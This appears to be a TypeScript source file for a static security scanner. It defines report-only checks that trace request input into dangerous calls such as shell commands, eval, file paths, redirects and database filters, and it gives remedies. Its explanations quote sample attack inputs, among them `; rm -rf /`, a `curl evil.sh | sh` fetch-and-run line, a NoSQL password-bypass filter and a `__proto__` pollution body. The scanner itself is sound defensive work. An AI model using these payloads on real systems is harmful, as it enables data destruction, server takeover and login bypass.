import type { Check, Finding, Severity } from "../types.js";
import { analyseRepo, type Flow, type FlowCategory } from "../analysis/taint.js";

/**
 * Data-flow checks: each reports where input from a request (or the browser URL) reaches one kind of
 * dangerous call, with the path it took. They share one analysis per scan (analysis/taint.ts).
 * All are report-only: the safe fix depends on what the code means, so the finding carries the
 * fix pattern instead of a patch.
 */

interface FlowCheckSpec {
  id: string;
  category: FlowCategory;
  title: string;
  severity: Severity;
  finding: string;
  explanation: string;
  remedy: string;
}

function evidence(f: Flow): string {
  const from = f.sourceFile === f.file ? `line ${f.sourceLine}` : `${f.sourceFile}:${f.sourceLine}`;
  const via = f.via.length ? ` → ${f.via.join(" → ")}` : "";
  return `${f.source} (${from})${via} → ${f.sink}`;
}

function flowCheck(spec: FlowCheckSpec): Check {
  return {
    id: spec.id,
    group: "C-security",
    title: spec.title,
    severity: spec.severity,
    mode: "report",
    detect({ repo }): Finding[] {
      return analyseRepo(repo)
        .flows.filter((f) => f.category === spec.category)
        .map((f) => ({
          checkId: spec.id,
          title: spec.finding,
          severity: spec.severity,
          file: f.file,
          line: f.line,
          evidence: evidence(f),
          explanation: `${f.detail ? f.detail[0].toUpperCase() + f.detail.slice(1) + ". " : ""}${spec.explanation}`,
          remedy: spec.remedy,
        }));
    },
  };
}

export const commandInjection = flowCheck({
  id: "command-injection",
  category: "command",
  title: "Command injection",
  severity: "critical",
  finding: "Request input reaches a shell command",
  explanation:
    "Anyone who can send this request can add `; rm -rf /` or `$(curl evil.sh | sh)` and run any program on the server with the app's permissions.",
  remedy:
    "Call the program directly with execFile/spawn and an argument array (no shell), e.g. `execFile('ping', ['-c', '1', host])`, and check the input against an allowlist pattern first.",
});

export const codeInjection = flowCheck({
  id: "code-injection",
  category: "code",
  title: "Code injection",
  severity: "critical",
  finding: "Request input is run as code",
  explanation: "eval, new Function, vm and dynamic require run whatever text they are given, so the sender can run their own JavaScript on the server.",
  remedy: "Remove the eval. Parse the data instead (JSON.parse, a small expression parser), or map the input to a fixed set of allowed functions.",
});

export const pathTraversal = flowCheck({
  id: "path-traversal",
  category: "path",
  title: "Path traversal",
  severity: "high",
  finding: "Request input chooses a file path",
  explanation: "With `../../` in the input the request can read or overwrite files outside the folder you meant, such as .env, keys or the source code.",
  remedy:
    "Keep only the file name (`path.basename(name)`), resolve it inside a fixed folder and check the result still starts with that folder; for downloads use `res.sendFile(name, { root: 'public' })`.",
});

export const ssrf = flowCheck({
  id: "ssrf",
  category: "ssrf",
  title: "Server-side request forgery",
  severity: "high",
  finding: "Request input chooses where the server sends a request",
  explanation:
    "The server can be pointed at internal addresses (cloud metadata at 169.254.169.254, databases, admin panels) that the attacker cannot reach directly, and returns what it finds.",
  remedy: "Fix the host in code and let the input choose only a path or ID, or check the URL's host against an allowlist and refuse private and link-local addresses after DNS lookup.",
});

export const openRedirect = flowCheck({
  id: "open-redirect",
  category: "redirect",
  title: "Open redirect",
  severity: "medium",
  finding: "Request input chooses where the user is redirected",
  explanation: "A link on your own domain can send users to a look-alike phishing page, and `javascript:` addresses can run script in the page.",
  remedy: "Redirect only to relative paths that start with a single `/`, or to a fixed list of allowed addresses; fall back to the home page otherwise.",
});

export const reflectedXss = flowCheck({
  id: "xss",
  category: "xss",
  title: "Cross-site scripting (XSS)",
  severity: "high",
  finding: "Input is written into a page as HTML",
  explanation: "A crafted link makes the page run the attacker's script in the victim's browser, which can steal sessions, read data on screen and act as the user.",
  remedy: "Send data as JSON, or escape it before it goes into HTML (`escape-html`, a templating engine with auto-escaping, `textContent` instead of `innerHTML`). Add a Content-Security-Policy as a second layer.",
});

export const nosqlInjection = flowCheck({
  id: "nosql-injection",
  category: "nosql",
  title: "NoSQL injection",
  severity: "high",
  finding: "Request input is used as a database filter",
  explanation:
    "JSON bodies and query strings can carry objects, so `{\"password\": {\"$ne\": null}}` matches every user and skips the password check. `$where` runs JavaScript in the database.",
  remedy: "Cast each field to the type you expect (`String(req.body.email)`), validate the body with a schema (zod, joi), or use express-mongo-sanitize to strip `$` keys.",
});

export const unsafeDeserialization = flowCheck({
  id: "unsafe-deserialization",
  category: "deserialize",
  title: "Unsafe deserialisation",
  severity: "critical",
  finding: "Request input is deserialised by a library that can run code",
  explanation: "node-serialize and js-yaml 3 load() rebuild functions from text, and a crafted payload runs immediately on the server.",
  remedy: "Use JSON.parse for data. For YAML use js-yaml 4 `load` (safe by default) or `safeLoad` on v3. Never deserialise cookies or bodies with node-serialize.",
});

export const prototypePollution = flowCheck({
  id: "prototype-pollution",
  category: "prototype",
  title: "Prototype pollution",
  severity: "medium",
  finding: "Request input is merged into an object by key",
  explanation:
    "A body like `{\"__proto__\": {\"isAdmin\": true}}` adds properties to every object in the process, which can bypass checks or crash the server.",
  remedy: "Copy only the fields you expect, validate the body with a schema, or merge into `Object.create(null)`; keep lodash at 4.17.21 or later.",
});

export const regexInjection = flowCheck({
  id: "regex-injection",
  category: "regex",
  title: "Regular expression injection",
  severity: "medium",
  finding: "Request input becomes a regular expression",
  explanation: "A pattern such as `(a+)+$` can take minutes to match, and one request ties up the server (ReDoS).",
  remedy: "Escape the input before building the pattern (`_.escapeRegExp(q)`) or search with `includes()` instead.",
});

/** SQL flows are reported by sql-string-concat (which also covers string-built SQL with no proven input). */
export const dataflowChecks: Check[] = [
  commandInjection,
  codeInjection,
  pathTraversal,
  ssrf,
  openRedirect,
  reflectedXss,
  nosqlInjection,
  unsafeDeserialization,
  prototypePollution,
  regexInjection,
];
